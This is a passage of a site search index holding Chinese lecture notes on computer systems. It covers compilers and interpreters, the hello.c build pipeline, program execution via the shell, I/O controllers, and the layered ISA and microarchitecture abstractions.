<p>\u663e\u7136\uff0c\u673a\u5668\u4e5f\u65e0\u6cd5\u76f4\u63a5\u7406\u89e3\u548c\u6267\u884c\u9ad8\u7ea7\u7f16\u7a0b\u8bed\u8a00\u7a0b\u5e8f\uff0c\u6545\u9700\u8981\u300c\u7ffb\u8bd1\u7a0b\u5e8f\u300d\u6216\u300c\u7ffb\u8bd1\u5668\u300d\uff08translator\uff09\u5c06\u5176\u8f6c\u6362\u4e3a\u673a\u5668\u8bed\u8a00\u7a0b\u5e8f\uff0c\u88ab\u7ffb\u8bd1\u7684\u8bed\u8a00\u548c\u7a0b\u5e8f\u5206\u522b\u79f0\u4e3a\u300c\u6e90\u8bed\u8a00\u300d\u548c\u300c\u6e90\u7a0b\u5e8f\u300d\uff0c\u7ffb\u8bd1\u751f\u6210\u7684\u8bed\u8a00\u548c\u7a0b\u5e8f\u5206\u522b\u79f0\u4e3a\u300c\u76ee\u6807\u8bed\u8a00\u300d\u548c\u300c\u76ee\u6807\u7a0b\u5e8f\u300d\uff0c\u7ffb\u8bd1\u7a0b\u5e8f\u4e00\u822c\u6709\u4ee5\u4e0b\u4e09\u7c7b\uff1a</p> <ul> <li>\u300c\u6c47\u7f16\u7a0b\u5e8f\u300d\u6216\u300c\u6c47\u7f16\u5668\u300d\uff08assembler\uff09\uff1a\u5c06\u6c47\u7f16\u8bed\u8a00\u6e90\u7a0b\u5e8f\u7ffb\u8bd1\u4e3a\u673a\u5668\u8bed\u8a00\u76ee\u6807\u7a0b\u5e8f\u3002</li> <li>\u300c\u89e3\u91ca\u7a0b\u5e8f\u300d\u6216\u300c\u89e3\u91ca\u5668\u300d\uff08interpreter\uff09\uff1a\u5c06\u6e90\u7a0b\u5e8f\u4e2d\u7684\u8bed\u53e5\u6309\u6267\u884c\u987a\u5e8f\u9010\u6761\u7ffb\u8bd1\u4e3a\u673a\u5668\u6307\u4ee4\u5e76\u7acb\u5373\u6267\u884c\u3002</li> <li>\u300c\u7f16\u8bd1\u7a0b\u5e8f\u300d\u6216\u300c\u7f16\u8bd1\u5668\u300d\uff08compiler\uff09\uff1a\u5c06\u9ad8\u7ea7\u8bed\u8a00\u6e90\u7a0b\u5e8f\u7ffb\u8bd1\u6210\u6c47\u7f16\u8bed\u8a00\u6216\u673a\u5668\u8bed\u8a00\u76ee\u6807\u7a0b\u5e8f\u3002</li> </ul>"},{"location":"in_class_learning/semester_3/introduction_to_computer_system/Theory_notes/Ch01-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/#_7","title":"\u4ece\u6e90\u7a0b\u5e8f\u5230\u53ef\u6267\u884c\u6587\u4ef6","text":"<p>\u4ee5 C \u8bed\u8a00\u6e90\u7a0b\u5e8f\uff08\u6587\u672c\u6587\u4ef6\uff09 <code>hello.c</code>\u5f00\u59cb\uff0c\u9010\u6b65\u8f6c\u6362\u4e3a\u53ef\u6267\u884c\u76ee\u6807\u6587\u4ef6 <code>hello</code> \u7684\u8fc7\u7a0b\u5982\u4e0b\uff1a</p> <ol> <li>\u7ecf\u8fc7\u9884\u5904\u7406\u7a0b\u5e8f\uff08cpp\uff09\u8f6c\u6362\u4e3a\u9884\u5904\u7406\u8fc7\u7684\u6e90\u6587\u4ef6\uff08\u6587\u672c\u6587\u4ef6\uff09<code>hello.i</code>.</li> <li>\u7ecf\u8fc7\u7f16\u8bd1\u7a0b\u5e8f\uff08ccl\uff09\u8f6c\u6362\u4e3a\u6c47\u7f16\u6e90\u7a0b\u5e8f\uff08\u6587\u672c\u6587\u4ef6\uff09<code>hello.s</code>.</li> <li>\u7ecf\u8fc7\u6c47\u7f16\u7a0b\u5e8f\uff08as\uff09\u8f6c\u6362\u4e3a\u53ef\u91cd\u5b9a\u4f4d\u76ee\u6807\u7a0b\u5e8f\uff08\u4e8c\u8fdb\u5236\u6587\u4ef6\uff09<code>hello.o</code></li> <li>\u7ecf\u8fc7\u94fe\u63a5\u7a0b\u5e8f\uff08ld\uff09\u8f6c\u6362\u4e3a\u53ef\u6267\u884c\u76ee\u6807\u7a0b\u5e8f\uff08\u4e8c\u8fdb\u5236\u6587\u4ef6\uff09<code>hello</code></li> </ol> <p>\u9884\u5904\u7406\u9636\u6bb5\uff1a\u9884\u5904\u7406\u7a0b\u5e8f\u5bf9\u6e90\u7a0b\u5e8f\u4e2d\u4ee5 <code>#</code> \u5b57\u7b26\u5f00\u5934\u7684\u547d\u4ee4\u8fdb\u884c\u5904\u7406\uff0c\u9884\u5904\u7406\u7a0b\u5e8f\u7684\u8f93\u51fa\u7ed3\u679c\u8fd8\u662f\u4e00\u4e2a\u6e90\u7a0b\u5e8f\u6587\u4ef6\uff0c\u4f46\u4ee5 <code>.i</code> \u4e3a\u6269\u5c55\u540d\u3002</p> <p>\u7f16\u8bd1\u9636\u6bb5\uff1a\u7f16\u8bd1\u7a0b\u5e8f\u5bf9\u9884\u5904\u7406\u540e\u7684\u6e90\u7a0b\u5e8f\u8fdb\u884c\u7f16\u8bd1\uff0c\u751f\u6210\u4e00\u4e2a\u6c47\u7f16\u8bed\u8a00\u6e90\u7a0b\u5e8f\u6587\u4ef6\uff0c\u4ee5 <code>.s</code> \u4e3a\u6269\u5c55\u540d\u3002\u5176\u548c\u5177\u4f53\u7684\u673a\u5668\u7ed3\u6784\u6709\u5173\u3002</p> <p>\u6c47\u7f16\u9636\u6bb5\uff1a\u6c47\u7f16\u7a0b\u5e8f\u5bf9\u6c47\u7f16\u8bed\u8a00\u6e90\u7a0b\u5e8f\u8fdb\u884c\u6c47\u7f16\uff0c\u751f\u6210\u4e00\u4e2a\u300c\u53ef\u91cd\u5b9a\u4f4d\u76ee\u6807\u6587\u4ef6\u300d\uff08relocatable object file\uff09\uff0c\u4ee5 <code>.o</code> \u4e3a\u6269\u5c55\u540d\uff0c\u5176\u4e3a\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u6253\u5f00\u540e\u4e3a\u4e71\u7801\u800c\u4e0d\u53ef\u8bfb\u3002</p> <p>\u94fe\u63a5\u9636\u6bb5\uff1a\u94fe\u63a5\u7a0b\u5e8f\u5c06\u591a\u4e2a\u53ef\u91cd\u5b9a\u4f4d\u76ee\u6807\u6587\u4ef6\u548c\u6807\u51c6\u51fd\u6570\u5e93\u4e2d\u7684\u53ef\u91cd\u5b9a\u4f4d\u76ee\u6807\u6587\u4ef6\u5408\u5e76\u6210\u4e3a\u300c\u53ef\u6267\u884c\u76ee\u6807\u6587\u4ef6\u300d\uff08executable object file\uff09\uff0c\u7b80\u79f0\u4e3a\u53ef\u6267\u884c\u6587\u4ef6\u3002</p> <p>\u5177\u4f53\u5730\uff0c\u5728 Linux \u7cfb\u7edf\u4e2d\uff0c\u53ef\u4f7f\u7528\u5982\u4e0b\u547d\u4ee4\u83b7\u5f97\u5176\u53ef\u6267\u884c\u6587\u4ef6\uff1a</p> <pre><code>linux&gt; gcc -o hello hello.c\n</code></pre>"},{"location":"in_class_learning/semester_3/introduction_to_computer_system/Theory_notes/Ch01-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/#_8","title":"\u53ef\u6267\u884c\u6587\u4ef6\u7684\u542f\u52a8\u548c\u6267\u884c","text":"<p>\u5728 Linux \u7cfb\u7edf\u4e2d\u53ef\u4ee5\u901a\u8fc7 shell \u547d\u4ee4\u884c\u89e3\u91ca\u5668\u6765\u6267\u884c\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u4f8b\u5982\uff1a</p> <pre><code>linux&gt; ./hello\n</code></pre> <p>\u5176\u4e2d <code>./hello</code> \u8868\u793a\u4e86 <code>hello</code> \u6587\u4ef6\u7684\u8def\u5f84\uff0c\u5177\u4f53\u6765\u8bf4\uff0cshell \u7a0b\u5e8f\u4f1a\u5c06\u7528\u6237\u4ece\u952e\u76d8\u8f93\u5165\u7684\u6bcf\u4e2a\u5b57\u7b26\u9010\u4e00\u8bfb\u5165 CPU \u5bc4\u5b58\u5668\u4e2d\uff0c\u7136\u540e\u5c06\u5176\u4fdd\u5b58\u5230\u4e3b\u50a8\u5b58\u5668\u4e2d\uff0c\u5728\u4e3b\u5b58\u7684\u7f13\u51b2\u533a\u4e2d\u5f62\u6210\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u3002\u4e00\u884c\u8f93\u5165\u5b8c\u4e86\uff0cshell \u5c06\u8c03\u51fa\u64cd\u4f5c\u7cfb\u7edf\u7ed9\u5185\u6838\u4e2d\u54cd\u5e94\u7684\u670d\u52a1\u4f8b\u7a0b\uff0c\u7531\u5185\u6838\u6765\u52a0\u8f7d\u786c\u76d8\u4e0a\u7684\u53ef\u6267\u884c\u6587\u4ef6\u5230\u5b58\u50a8\u5668\u3002\u5185\u6838\u52a0\u8f7d\u5b8c\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u7684\u4ee3\u7801\u53ca\u5176\u7d22\u8981\u5904\u7406\u7684\u6570\u636e\u540e\uff0c\u5c06\u6587\u4ef6\u7b2c\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740\u9001\u5230\u7a0b\u5e8f\u8ba1\u6570\u5668 PC \u4e2d\uff0c\u56e0 CPU \u6c38\u8fdc\u90fd\u5c06 PC \u4e2d\u7684\u5185\u5bb9\u4f5c\u4e3a\u5c06\u8981\u6267\u884c\u7684\u6307\u4ee4\u7684\u5730\u5740\uff0c\u56e0\u6b64\u5904\u7406\u5668\u968f\u540e\u5f00\u59cb\u6267\u884c\u7a0b\u5e8f\uff0c\u6700\u7ec8\u5c06\u7ed3\u679c\u4ece\u4e3b\u5b58\u53d6\u5230 CPU \u7684\u5bc4\u5b58\u5668\u4e2d\uff0c\u5e76\u9001\u663e\u793a\u5668\u663e\u5f0f\u3002</p> <p>\u3010\u8fd9\u91cc\u6709\u4e00\u5f20\u56fe\u3011</p> <p>\u5728\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\uff0c\u7528\u6237\u7a0b\u5e8f\u88ab\u542f\u52a8\u6267\u884c\uff0c\u5fc5\u987b\u4f9d\u9760\u64cd\u4f5c\u7cfb\u7edf\u7684\u652f\u6301\uff0c\u5176\u5305\u62ec\u4eba\u673a\u63a5\u53e3\u73af\u5883\uff08\u5982\u5916\u58f3 shell \u7a0b\u5e8f\uff09\u548c\u5185\u6838 kernel \u670d\u52a1\u4f8b\u7a0b\u3002</p> <p>\u5176\u4e2d shell \u547d\u4ee4\u884c\u89e3\u91ca\u5668\u5c31\u662f\u64cd\u4f5c\u7cfb\u7edf\u5916\u58f3\u7a0b\u5e8f\uff0c\u5176\u4e3a\u7528\u6237\u63d0\u4f9b\u4e86\u4e00\u4e2a\u542f\u52a8\u7a0b\u5e8f\u6267\u884c\u7684\u73af\u5883\uff0c\u7528\u4e8e\u5bf9\u7528\u6237\u4ece\u952e\u76d8\u8f93\u5165\u7684\u547d\u4ee4\u8fdb\u884c\u89e3\u91ca\uff0c\u5e76\u8c03\u51fa\u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\u6765\u52a0\u8f7d\u7528\u6237\u7a0b\u5e8f\uff08\u7528\u6237\u4ece\u952e\u76d8\u8f93\u5165\u7684\u547d\u4ee4\u6240\u5bf9\u5e94\u7684\u7a0b\u5e8f\uff09\u3002</p> <p>\u5176\u4e2d\u5185\u6838\u670d\u52a1\u4f8b\u7a0b\u7528\u4e8e\u52a0\u8f7d\u7528\u6237\u7a0b\u5e8f\u5e76\u4f7f\u5176\u4ece\u7b2c\u4e00\u6761\u6307\u4ee4\u5f00\u59cb\u6267\u884c\u3002</p> <p>\u6b64\u5916\uff0c\u5bf9\u4e8e\u952e\u76d8\u3001\u786c\u76d8\u548c\u663e\u793a\u5668\u7b49\u5916\u90e8\u8bbe\u5907\u7684\u64cd\u4f5c\uff0c\u56e0\u8fd9\u4e9b\u5e95\u5c42\u786c\u4ef6\u4e0d\u80fd\u7531\u7528\u6237\u7a0b\u5e8f\u76f4\u63a5\u8bbf\u95ee\uff0c\u6545\u800c\u4e5f\u9700\u8981\u4f9d\u9760\u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\u670d\u52a1\u4f8b\u7a0b\u7684\u652f\u6301\u3002</p> <p>\u8fd9\u4e9b\u5916\u90e8\u8bbe\u5907\u7b80\u79f0\u4e3a\u300c\u5916\u8bbe\u300d\uff0c\u4e5f\u79f0\u4e3a\u300cI/O \u8bbe\u5907\u300d\uff0cI/O \u5373 Input/Output\uff08\u8f93\u5165\u8f93\u51fa\uff09\u3002\u5916\u90e8\u8bbe\u5907\u901a\u5e38\u7531\u673a\u68b0\u90e8\u5206\u548c\u7535\u5b50\u90e8\u5206\u7ec4\u6210\uff0c\u4e24\u90e8\u5206\u901a\u5e38\u662f\u5206\u5f00\u7684\u3002\u673a\u68b0\u90e8\u5206\u662f\u5916\u8bbe\u672c\u8eab\uff0c\u7535\u5b50\u90e8\u5206\u662f\u63a7\u5236\u5916\u8bbe\u5de5\u4f5c\u7684\u300cI/O \u63a7\u5236\u5668\u300d\u6216\u300cI/O \u9002\u914d\u5668\u300d\uff0c\u5176\u4e2d\u5916\u8bbe\u901a\u8fc7 I/O \u63a7\u5236\u5668\u6216 I/O \u9002\u914d\u5668\u8fde\u5230\u4e3b\u673a\uff0cI/O \u63a7\u5236\u5668\u548c I/O \u9002\u914d\u5668\u7edf\u79f0\u300c\u8bbe\u5907\u63a7\u5236\u5668\u300d\u3002\u4f8b\u5982\u952e\u76d8\u63a5\u53e3\u3001\u6253\u5370\u673a\u9002\u914d\u5668\u3001\u663e\u793a\u63a7\u5236\u5361\uff08\u663e\u5361\uff09\u3001\u7f51\u7edc\u63a7\u5236\u5361\uff08\u7f51\u5361\uff09\u7b49\u90fd\u662f\u8bbe\u5907\u63a7\u5236\u5668\uff0c\u5c5e\u4e8e\u300cI/O \u6a21\u5757\u300d\u3002</p> <p>\u7a0b\u5e8f\u7684\u6267\u884c\u8fc7\u7a0b\u5c31\u662f\u6570\u636e\u5728 CPU\u3001\u4e3b\u5b58\u548c I/O \u6a21\u5757\u4e4b\u95f4\u6d41\u52a8\u7684\u8fc7\u7a0b\uff0c\u6240\u6709\u6570\u636e\u7684\u6d41\u52a8\u90fd\u662f\u901a\u8fc7\u300c\u603b\u7ebf\u300d\u3001\u300cI/O \u6865\u63a5\u5668\u300d\u7b49\u8fdb\u884c\u7684\uff0c\u5728\u603b\u7ebf\u4e0a\u4f20\u8f93\u6570\u636e\u4e4b\u524d\uff0c\u9700\u8981\u5148\u5c06\u5176\u7f13\u5b58\u5728\u5b58\u50a8\u90e8\u4ef6\u4e2d\u3002\u9664\u4e3b\u5b58\u672c\u8eab\u662f\u5b58\u50a8\u90e8\u4ef6\u5916\uff0c\u5728 CPU\u3001I/O \u6865\u63a5\u5668\u3001\u8bbe\u5907\u63a7\u5236\u5668\u4e2d\u4e5f\u6709\u5b58\u653e\u6570\u636e\u7684\u7f13\u51b2\u5b58\u50a8\u90e8\u4ef6\u3002</p>"},{"location":"in_class_learning/semester_3/introduction_to_computer_system/Theory_notes/Ch01-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/#_9","title":"\u8ba1\u7b97\u673a\u7cfb\u7edf\u7684\u5c42\u6b21\u7ed3\u6784","text":"<p>\u4f20\u7edf\u8ba1\u7b97\u673a\u7cfb\u7edf\u91c7\u7528\u5206\u5c42\u65b9\u5f0f\u6784\u5efa\uff0c\u5373\u8ba1\u7b97\u673a\u7cfb\u7edf\u662f\u4e00\u4e2a\u5c42\u6b21\u7ed3\u6784\uff0c\u901a\u8fc7\u5411\u4e0a\u5c42\u7528\u6237\u63d0\u4f9b\u4e00\u4e2a\u62bd\u8c61\u7684\u7b80\u6d01\u63a5\u53e3\u800c\u5c06\u8f83\u4f4e\u5c42\u6b21\u7684\u5b9e\u73b0\u7ec6\u8282\u9690\u85cf\u8d77\u6765\uff0c\u8ba1\u7b97\u673a\u89e3\u51b3\u5e94\u7528\u95ee\u9898\u7684\u8fc7\u7a0b\u5c31\u662f\u4e0d\u540c\u62bd\u8c61\u5c42\u8fdb\u884c\u8f6c\u6362\u7684\u8fc7\u7a0b\u3002</p>"},{"location":"in_class_learning/semester_3/introduction_to_computer_system/Theory_notes/Ch01-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/#_10","title":"\u8ba1\u7b97\u673a\u7cfb\u7edf\u62bd\u8c61\u5c42\u7684\u8f6c\u6362","text":"<pre><code>1. \u5e94\u7528\uff08\u95ee\u9898\uff09\n2. \u7b97\u6cd5\n3. \u7f16\u7a0b\uff08\u8bed\u8a00\uff09\n4. \u64cd\u4f5c\u7cfb\u7edf / \u865a\u62df\u673a\n5. \u6307\u4ee4\u96c6\u4f53\u7cfb\u7ed3\u6784\uff08ISA\uff09\n6. \u5fae\u4f53\u7cfb\u7ed3\u6784\n7. \u529f\u80fd\u90e8\u4ef6 / RTL\n8. \u7535\u8def\n9. \u5668\u4ef6\n</code></pre> <p>\u5176\u4e2d\uff1a1.-5. \u4e3a\u8f6f\u4ef6\u5c42\uff0c5.-9. \u4e3a\u786c\u4ef6\u5c42\u30021. \u9762\u5411\u6700\u7ec8\u7528\u6237\uff0c2.-4. \u9762\u5411\u7a0b\u5e8f\u5458\uff0c5.-7. \u9762\u5411\u67b6\u6784\u5e08\uff0c8.-9. \u9762\u5411\u7535\u5b50\u5de5\u7a0b\u5e08\u3002</p> <pre><code>\u5e0c\u671b\u8ba1\u7b97\u673a\u5b8c\u6210\u6216\u89e3\u51b3\u7684\u4efb\u4f55\u5e94\u7528\uff08\u95ee\u9898\uff09\u6700\u5f00\u59cb\u5f62\u6210\u65f6\u901a\u5e38\u7528\u81ea\u7136\u8bed\u8a00\u63cf\u8ff0\uff0c\u4f46\u662f\u8ba1\u7b97\u673a\u53ea\u80fd\u7406\u89e3\u673a\u5668\u8bed\u8a00\u3002\n\u8981\u5c06\u4e00\u4e2a\u81ea\u7136\u8bed\u8a00\u63cf\u8ff0\u7684\u5e94\u7528\u95ee\u9898\u8f6c\u6362\u4e3a\u673a\u5668\u8bed\u8a00\u7a0b\u5e8f\uff0c\u9700\u8981\u7ecf\u8fc7\u5e94\u7528\u95ee\u9898\u63cf\u8ff0\u3001\u7b97\u6cd5\u62bd\u8c61\u3001\u9ad8\u7ea7\u8bed\u8a00\u7a0b\u5e8f\u8bbe\u8ba1\u3001\u5c06\u9ad8\u7ea7\u8bed\u8a00\u6e90\u7a0b\u5e8f\u8f6c\u6362\u4e3a\u7279\u5b9a\u673a\u5668\u8bed\u8a00\u76ee\u6807\u7a0b\u5e8f\u7b49\u591a\u4e2a\u62bd\u8c61\u5c42\u7684\u8f6c\u6362\u3002\n\u5728\u8fdb\u884c\u9ad8\u7ea7\u8bed\u8a00\u7a0b\u5e8f\u8bbe\u8ba1\u65f6\uff0c\u9700\u8981\u6709\u76f8\u5e94\u7684\u300c\u7a0b\u5e8f\u5f00\u53d1\u652f\u6491\u73af\u5883\u300d\u3002\u9700\u8981\u4e00\u4e2a\u300c\u7a0b\u5e8f\u7f16\u8f91\u5668\u300d\uff0c\u4ee5\u65b9\u4fbf\u6e90\u7a0b\u5e8f\u7684\u7f16\u5199\uff0c\u9700\u8981\u4e00\u5957\u300c\u7ffb\u8bd1\u8f6c\u6362\u8f6f\u4ef6\u300d\uff0c\u4ee5\u5904\u7406\u5404\u7c7b\u6e90\u7a0b\u5e8f\uff0c\u5176\u4e2d\u5305\u62ec\u9884\u5904\u7406\u7a0b\u5e8f\u3001\u7f16\u8bd1\u5668\u3001\u6c47\u7f16\u5668\u3001\u94fe\u63a5\u5668\u7b49\uff1b\u8fd8\u9700\u8981\u4e00\u4e2a\u53ef\u4ee5\u6267\u884c\u5404\u7c7b\u7a0b\u5e8f\u7684\u300c\u7528\u6237\u754c\u9762\u300d\uff0c\u5982 GUI \u65b9\u5f0f\u4e0b\u7684\u300c\u56fe\u5f62\u7528\u6237\u754c\u9762\u300d\u6216 CLI \u65b9\u5f0f\u4e0b\u7684\u300c\u547d\u4ee4\u884c\u7528\u6237\u754c\u9762\u300d\uff08\u5982 shell \u7a0b\u5e8f\uff09\u3002\n\u63d0\u4f9b\u7a0b\u5e8f\u7f16\u8f91\u5668\u548c\u5404\u7c7b\u7ffb\u8bd1\u8f6c\u6362\u8f6f\u4ef6\u7684\u5de5\u5177\u5305\u7edf\u79f0\u4e3a\u300c\u8bed\u8a00\u5904\u7406\u7cfb\u7edf\u300d\uff0c\u800c\u5177\u6709\u4eba\u673a\u4ea4\u4e92\u529f\u80fd\u7684\u7528\u6237\u754c\u9762\u548c\u5e95\u5c42\u7cfb\u7edf\u8c03\u7528\u670d\u52a1\u4f8b\u7a0b\u5219\u7531\u300c\u64cd\u4f5c\u7cfb\u7edf\u300d\u63d0\u4f9b\u3002\n\u6240\u6709\u7684\u8bed\u8a00\u5904\u7406\u7cfb\u7edf\u90fd\u5fc5\u987b\u5728\u64cd\u4f5c\u7cfb\u7edf\u63d0\u4f9b\u7684\u8ba1\u7b97\u673a\u73af\u5883\u4e2d\u8fd0\u884c\uff0c\u64cd\u4f5c\u7cfb\u7edf\u662f\u5bf9\u8ba1\u7b97\u673a\u5e95\u5c42\u7ed3\u6784\u548c\u8ba1\u7b97\u673a\u786c\u4ef6\u7684\u4e00\u79cd\u62bd\u8c61\uff0c\u8fd9\u79cd\u62bd\u8c61\u6784\u6210\u4e86\u53ef\u4ee5\u8ba9\u7a0b\u5e8f\u5458\u4f7f\u7528\u7684\u300c\u865a\u62df\u673a\u300d\uff08virtual machine\uff09.\n\u673a\u5668\u8bed\u8a00\u7a0b\u5e8f\u6240\u8fd0\u884c\u7684\u8ba1\u7b97\u673a\u786c\u4ef6\u548c\u8f6f\u4ef6\u4e4b\u95f4\u7684\u6240\u8c13\u6865\u6881\uff0c\u8fd9\u4e2a\u754c\u9762\u5c31\u662f\u300c\u6307\u4ee4\u96c6\u4f53\u7cfb\u7ed3\u6784\u300d\uff08ISA, instructioni set architecture\uff09\uff0c\u7b80\u79f0\u300c\u6307\u4ee4\u7cfb\u7edf\u300d\uff0c\u4e5f\u79f0\u4e3a\u300c\u67b6\u6784\u300d\uff0c\u5b83\u662f\u8f6f\u4ef6\u548c\u786c\u4ef6\u4e4b\u95f4\u63a5\u53e3\u7684\u4e00\u4e2a\u5b8c\u6574\u5b9a\u4e49\u3002\nISA \u5b9a\u4e49\u4e86\u4e00\u53f0\u8ba1\u7b97\u673a\u53ef\u4ee5\u6267\u884c\u7684\u6240\u6709\u6307\u4ee4\u7684\u96c6\u5408\uff0c\u6bcf\u6761\u6307\u4ee4\u89c4\u5b9a\u4e86\u8ba1\u7b97\u673a\u6267\u884c\u4ec0\u4e48\u64cd\u4f5c\uff0c\u4ee5\u53ca\u6240\u5904\u7406\u7684\u64cd\u4f5c\u6570\u5b58\u653e\u7684\u5730\u5740\u7a7a\u95f4\u548c\u64cd\u4f5c\u6570\u7c7b\u578b\uff0cISA \u89c4\u5b9a\u7684\u5185\u5bb9\u5305\u62ec\uff1a\u6570\u636e\u7c7b\u578b\u53ca\u683c\u5f0f\uff0c\u6307\u4ee4\u683c\u5f0f\uff0c\u5bfb\u5740\u65b9\u5f0f\u548c\u53ef\u8bbf\u95ee\u5730\u5740\u7a7a\u95f4\u5927\u5c0f\uff0c\u7a0b\u5e8f\u53ef\u8bbf\u95ee\u7684\u901a\u7528\u5bc4\u5b58\u5668\u7684\u4e2a\u6570\u3001\u4f4d\u6570\u548c\u7f16\u53f7\uff0c\u72b6\u6001/\u63a7\u5236\u5bc4\u5b58\u5668\u7684\u5b9a\u4e49\uff0cI/O \u7a7a\u95f4\u7684\u7f16\u5740\u65b9\u5f0f\uff0c\u7ec8\u7aef\u7ed3\u6784\uff0c\u673a\u5668\u5de5\u4f5c\u72b6\u6001\u7684\u5b9a\u4e49\u548c\u8f6c\u6362\uff0cI/O \u4f20\u9001\u65b9\u5f0f\uff0c\u5b58\u50a8\u4fdd\u62a4\u65b9\u5f0f\u7b49\u3002\u56e0\u6b64\uff0c\u6307\u4ee4\u96c6\u4f53\u7cfb\u7ed3\u6784\u662f\u6307\u8f6f\u4ef6\u80fd\u611f\u77e5\u5230\u7684\u90e8\u5206\uff0c\u4e5f\u79f0\u300c\u8f6f\u4ef6\u53ef\u89c1\u90e8\u5206\u300d\u3002\n\u673a\u5668\u8bed\u8a00\u7a0b\u5e8f\u5c31\u662f\u4e00\u4e2a ISA \u89c4\u5b9a\u7684\u6307\u4ee4\u5e8f\u5217\uff0c\u56e0\u6b64\uff0c\u8ba1\u7b97\u673a\u786c\u4ef6\u6267\u884c\u673a\u5668\u8bed\u8a00\u7a0b\u5e8f\u7684\u8fc7\u7a0b\u5c31\u662f\u6267\u884c\u4e00\u6761\u6761\u6307\u4ee4\u7684\u8fc7\u7a0b\u3002ISA \u662f\u5bf9\u6307\u4ee4\u7cfb\u7edf\u7684\u4e00\u79cd\u89c4\u5b9a\u6216\u7ed3\u6784\u89c4\u8303\uff0c\u5b9e\u73b0 ISA \u7684\u5177\u4f53\u903b\u8f91\u7ed3\u6784\u79f0\u4e3a\u300c\u8ba1\u7b97\u673a\u7ec4\u7ec7\u300d\uff08computer organization\uff09\u6216\u300c\u5fae\u4f53\u7cfb\u7ed3\u6784\u300d\uff08micro-architecture\uff09\uff0c\u7b80\u79f0\u4e3a\u300c\u5fae\u67b6\u6784\u300d\u3002\nISA \u548c\u5fae\u4f53\u7cfb\u7ed3\u6784\u662f\u4e0d\u540c\u5c42\u9762\u4e0a\u7684\u4e24\u4e2a\u6982\u5ff5\uff0c\u5fae\u4f53\u7cfb\u7ed3\u6784\u662f\u8f6f\u4ef6\u4e0d\u53ef\u611f\u77e5\u7684\u90e8\u5206\u3002\u4f8b\u5982\u52a0\u6cd5\u5668\u91c7\u7528\u4e32\u884c\u8fdb\u4f4d\u8fd8\u662f\u5e76\u884c\u8fdb\u4f4d\u5b9e\u73b0\u5c5e\u4e8e\u5fae\u4f53\u7cfb\u7ed3\u6784\u8003\u8651\u7684\u8303\u7574\uff0c\u4e0e\u7a0b\u5e8f\u7f16\u5199\u65e0\u5173\uff0cISA \u4e5f\u4e0d\u77e5\u9053\u8fd9\u91cc\u52a0\u6cd5\u5177\u4f53\u7684\u5b9e\u73b0\u3002\n\u76f8\u540c\u7684 ISA \u53ef\u80fd\u5177\u6709\u4e0d\u540c\u7684\u5fae\u4f53\u7cfb\u7ed3\u6784\u3002\u5fae\u4f53\u7cfb\u7ed3\u6784\u6700\u7ec8\u7531\u300c\u903b\u8f91\u7535\u8def\u300d\uff08logic circuit\uff09\u5b9e\u73b0\uff0c\u800c\u6bcf\u4e2a\u57fa\u672c\u7684\u903b\u8f91\u7535\u8def\u90fd\u662f\u6309\u7167\u7279\u5b9a\u7684\u300c\u5668\u4ef6\u6280\u672f\u300d\uff08device technology\uff09\u5b9e\u73b0\u7684\u3002\n</code></pre>"},{"location":"in_class_learning/semester_3/introduction_to_computer_system/Theory_notes/Ch01-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/#_11","title":"\u8ba1\u7b97\u673a\u6838\u5fc3\u5c42\u4e4b\u95f4\u7684\u5173\u8054","text":"<p>\u9ad8\u7ea7\u7f16\u7a0b\u8bed\u8a00\u7f16\u8bd1\u5668\u5c06\u9ad8\u7ea7\u8bed\u8a00\u6e90\u7a0b\u5e8f\u8f6c\u6362\u4e3a\u673a\u5668\u7ea7\u76ee\u6807\u4ee3\u7801\uff0c\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\u5305\u542b\u591a\u4e2a\u6b65\u9aa4\uff0c\u5305\u62ec\u8bcd\u6cd5\u5206\u6790\u3001\u8bed\u6cd5\u5206\u6790\u3001\u8bed\u4e49\u5206\u6790\u3001\u4e2d\u95f4\u4ee3\u7801\u751f\u6210\u3001\u4ee3\u7801\u4f18\u5316\u3001\u76ee\u6807\u4ee3\u7801\u751f\u6210\u548c\u76ee\u6807\u4ee3\u7801\u4f18\u5316\u7b49\u3002\u8fd9\u6574\u4e2a\u8fc7\u7a0b\u53ef\u4ee5\u5212\u5206\u4e3a\u300c\u524d\u7aef\u300d\u548c\u300c\u540e\u7aef\u300d\u4e24\u5757\uff0c\u901a\u5e38\u628a\u4e2d\u95f4\u4ee3\u7801\u751f\u6210\u53ca\u4e4b\u524d\u7684\u90e8\u5206\u79f0\u4e3a\u524d\u7aef\u3002</p> <p>\u56e0\u6b64\uff0c\u524d\u7aef\u4e3b\u8981\u5b8c\u6210\u5bf9\u6e90\u7a0b\u5e8f\u7684\u5206\u6790\uff0c\u628a\u6e90\u7a0b\u5e8f\u5207\u5206\u6210\u4e00\u4e9b\u57fa\u672c\u5757\uff0c\u5e76\u751f\u6210\u4e2d\u95f4\u8bed\u8a00\u8868\u793a\uff0c\u540e\u7aef\u5728\u5206\u6790\u7ed3\u679c\u6b63\u786e\u65e0\u8bef\u7684\u57fa\u7840\u4e0a\uff0c\u628a\u4e2d\u95f4\u8bed\u8a00\u8868\u793a\uff08\u4e2d\u95f4\u4ee3\u7801\uff09\u8f6c\u5316\u4e3a\u76ee\u6807\u673a\u5668\u652f\u6301\u7684\u673a\u5668\u7ea7\u8bed\u8a00\u7a0b\u5e8f\u3002</p> 